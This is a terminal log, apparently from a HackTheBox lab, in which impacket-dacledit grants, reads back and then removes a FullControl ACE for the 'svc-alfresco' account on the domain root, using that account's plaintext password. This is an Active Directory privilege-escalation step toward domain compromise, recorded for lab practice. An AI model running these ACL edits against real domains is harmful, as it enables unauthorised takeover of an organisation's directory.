```sh
└─$ impacket-dacledit -ts -dc-ip 10.129.95.210 -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' -action write -rights FullControl -ace-type allowed 'htb.local/svc-alfresco:s3rvice' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-17 20:59:36] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-08-17 20:59:42] [+] Initializing domainDumper()
[2025-08-17 20:59:43] [+] Target principal found in LDAP (DC=HTB,DC=LOCAL)
[2025-08-17 20:59:44] [+] Found principal SID: S-1-5-21-3072663084-364016917-1341370565-1147
[2025-08-17 20:59:44] [+] Appending ACE (S-1-5-21-3072663084-364016917-1341370565-1147 --(FullControl)--> None)
[2025-08-17 20:59:44] [+] ACE created.
[2025-08-17 20:59:44] [*] DACL backed up to dacledit-20250817-205944.bak
[2025-08-17 20:59:44] [+] Attempts to modify the Security Descriptor.
[2025-08-17 20:59:44] [*] DACL modified successfully!


└─$ impacket-dacledit -ts -dc-ip 10.129.95.210 -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' -action read -ace-type allowed 'htb.local/svc-alfresco:s3rvice' -debug                     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-17 21:05:09] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-08-17 21:05:16] [+] Initializing domainDumper()
[2025-08-17 21:05:16] [+] Target principal found in LDAP (DC=HTB,DC=LOCAL)
[2025-08-17 21:05:17] [+] Found principal SID: S-1-5-21-3072663084-364016917-1341370565-1147
[2025-08-17 21:05:17] [*] Parsing DACL
[2025-08-17 21:05:47] [*] Printing parsed DACL
[2025-08-17 21:05:47] [*] Filtering results for SID (S-1-5-21-3072663084-364016917-1341370565-1147)
[2025-08-17 21:05:47] [*]   ACE[116] info                
[2025-08-17 21:05:47] [*]     ACE Type                  : ACCESS_ALLOWED_ACE
[2025-08-17 21:05:47] [*]     ACE flags                 : None
[2025-08-17 21:05:47] [*]     Access mask               : FullControl (0xf01ff)
[2025-08-17 21:05:47] [*]     Trustee (SID)             : svc-alfresco (S-1-5-21-3072663084-364016917-1341370565-1147)


└─$ impacket-dacledit -ts -dc-ip 10.129.95.210 -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' -action remove -rights FullControl -ace-type allowed 'htb.local/svc-alfresco:s3rvice' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-17 21:00:25] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-08-17 21:00:31] [+] Initializing domainDumper()
[2025-08-17 21:00:32] [+] Target principal found in LDAP (DC=HTB,DC=LOCAL)
[2025-08-17 21:00:32] [+] Found principal SID: S-1-5-21-3072663084-364016917-1341370565-1147
[2025-08-17 21:00:32] [+] ACE created.
[2025-08-17 21:00:32] [+] This ACE will be removed
[2025-08-17 21:00:32] [*]     ACE Type                  : ACCESS_ALLOWED_ACE
[2025-08-17 21:00:32] [*]     ACE flags                 : None
[2025-08-17 21:00:32] [*]     Access mask               : FullControl (0xf01ff)
[2025-08-17 21:00:32] [*]     Trustee (SID)             : svc-alfresco (S-1-5-21-3072663084-364016917-1341370565-1147)
[2025-08-17 21:00:32] [*] DACL backed up to dacledit-20250817-210032.bak
[2025-08-17 21:00:32] [+] Attempts to modify the Security Descriptor.
[2025-08-17 21:00:33] [*] DACL modified successfully!
```
